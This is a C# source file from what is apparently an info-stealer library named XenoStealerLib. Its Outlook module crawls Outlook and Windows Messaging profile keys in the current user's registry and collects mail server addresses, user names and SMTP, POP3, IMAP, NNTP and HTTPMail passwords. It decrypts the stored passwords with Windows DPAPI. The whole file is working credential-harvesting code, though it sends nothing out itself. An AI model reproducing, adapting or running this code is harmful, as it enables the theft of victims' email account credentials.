using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace XenoStealerLib.Utils
{
    public static class Outlook
    {
        private static Regex smptClient = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$", RegexOptions.Compiled);
        private static Regex mailClient = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$", RegexOptions.Compiled);
        private static string[] RegistryLocations = new string[]
        {
            "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
        };

        private static string[] RegistryKeys = new string[]
        {
            "SMTP Email Address","SMTP Server","POP3 Server",
            "POP3 User Name","SMTP User Name","NNTP Email Address",
            "NNTP User Name","NNTP Server","IMAP Server","IMAP User Name",
            "Email","HTTP User","HTTP Server URL","POP3 User",
            "IMAP User", "HTTPMail User Name","HTTPMail Server",
            "SMTP User","POP3 Password2","IMAP Password2",
            "NNTP Password2","HTTPMail Password2","SMTP Password2",
            "POP3 Password","IMAP Password","NNTP Password",
            "HTTPMail Password","SMTP Password"
        };
        public static List<OutlookInfo> GrabOutlook() 
        {
            List<OutlookInfo> outlookInfos = new List<OutlookInfo>();
            foreach (string RegPath in RegistryLocations)
            {
                GrabOutlook(outlookInfos, RegPath);
            }
            return outlookInfos;
        }

        private static void GrabOutlook(List<OutlookInfo> outlookInfos, string RegPath)
        {
            foreach (string RegKey in RegistryKeys)
            {
                object data = GetObjectFromReg(RegPath, RegKey);
                if (data == null)
                {
                    continue;
                }
                string dataString = data.ToString();
                bool isBytes = data.GetType() == typeof(byte[]);
                if (isBytes && RegKey.Contains("Password") && !RegKey.Contains("2"))
                {
                    string KeyData = DecryptData((byte[])data);
                    if (KeyData != null)
                    {
                        outlookInfos.Add(new OutlookInfo(RegPath, RegKey, KeyData));
                    }
                }
                else if (smptClient.IsMatch(dataString) || mailClient.IsMatch(dataString))
                {
                    outlookInfos.Add(new OutlookInfo(RegPath, RegKey, dataString));
                }
                else if (isBytes)
                {
                    try
                    {
                        string KeyData = Encoding.Unicode.GetString((byte[])data);
                        outlookInfos.Add(new OutlookInfo(RegPath, RegKey, KeyData));
                    }
                    catch { }
                }
            }

            string[] IncrementalTree = null;

            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        using (RegistryKey OpenedKey = CurrentUserX.OpenSubKey(RegPath))
                        {
                            IncrementalTree = OpenedKey.GetSubKeyNames();
                            break;
                        }
                    }
                }
                catch
                {

                }
            }

            if (IncrementalTree != null) 
            {
                foreach (string key in IncrementalTree) 
                {
                    GrabOutlook(outlookInfos, Path.Combine(RegPath, key));
                }
                
            }

        }
        private static object GetObjectFromReg(string path, string key) 
        {
            object data = null;
            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        using (RegistryKey OpenedKey = CurrentUserX.OpenSubKey(path)) 
                        {
                            data = OpenedKey.GetValue(key);
                            break;
                        }
                    }
                }
                catch 
                { 
                    
                }
            }
            return data;
        }

        private static string DecryptData(byte[] encryptedData)
        {
            try
            {
                byte[] decoded = new byte[encryptedData.Length - 1];
                Buffer.BlockCopy(encryptedData, 1, decoded, 0, decoded.Length);
                return Encoding.Unicode.GetString(ProtectedData.Unprotect(decoded, null, DataProtectionScope.CurrentUser));

            }
            catch
            {
            }
            return null;
        }

        public class OutlookInfo 
        {
            public string RegistryPath;
            public string RegistryKey;
            public string RegistryValue;
            public OutlookInfo(string RegistryPath, string RegistryKey, string RegistryValue) 
            {
                this.RegistryPath = RegistryPath;
                this.RegistryKey = RegistryKey;
                this.RegistryValue = RegistryValue;
            }
        }

    }
}
